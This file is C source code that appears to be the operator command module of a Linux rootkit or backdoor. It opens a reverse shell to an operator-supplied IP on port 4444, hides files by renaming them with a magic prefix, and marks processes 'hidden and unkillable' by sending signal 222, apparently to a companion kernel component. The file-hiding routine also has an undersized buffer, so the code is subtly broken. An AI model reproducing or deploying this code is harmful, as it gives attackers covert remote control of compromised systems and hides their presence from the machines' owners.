#include "../inc/config.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <string.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <libgen.h>
#include <limits.h>
#include <stdio.h>

#include "util.h"
#include "cmds.h"

int cmd_shell(int s) {
  info(s, "Enter an IP for the reverse shell");
  info(s, "You will receive the connection on port 4444");
  prompt(s);

  char* ip = recvline(s);
  if(NULL == ip)
    return -1;

  info(s, "Creating the reverse shell fork...");

  int fpid = fork();
  if(fpid == 0){
    close(s);
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);

    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(4444);
    revsockaddr.sin_addr.s_addr = inet_addr(ip);
    connect(sockt, (struct sockaddr *) &revsockaddr, 
      sizeof(revsockaddr));

    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);
  }

  if(fpid<0){
    error(s, "Fork failed :<");
    goto END;
  }

  kill(fpid, 222);
  info(s, "Fork created, enjoy your shell");
  free(ip);
  return 0;

END:
  free(ip);
  return -1;
}

int cmd_hide(int s) {
  info(s, "Enter full path for the file");
  info(s, "It will be moved to [USUM]_[name]");
  prompt(s);

  char* path = recvline(s);
  if(NULL == path)
    return -1;

  if(!exists(path)){
    error(s, "Cannot access the file");
    free(path);
    return -1;
  }

  char* pathcp = strdup(path);
  char* file   = basename(path);
  char* dir    = dirname(path);

  char newpath[strlen(path)+strlen(USUM)];
  sprintf(newpath, "%s/%s_%s", dir, USUM, file);

  if(rename(pathcp, newpath)<0){
    error(s, "Move failed!");
    free(pathcp);
    free(path);
    return -1;
  }

  info(s, "Moved file");
  free(pathcp);
  free(path);
  return 0;
}

int cmd_pid(int s) {
  info(s, "Enter a process PID to protect");
  info(s, "Process will be hidden and unkillable");
  prompt(s);

  char* pidstr = recvline(s);
  if(NULL == pidstr)
    return -1;

  int pid = atoi(pidstr);
  if(pid<=0){
    error(s, "Bad PID");
    free(pidstr);
    return -1;
  }

  info(s, "Sending signal to the PID...");
  kill(pid, 222);
  return 0;
}
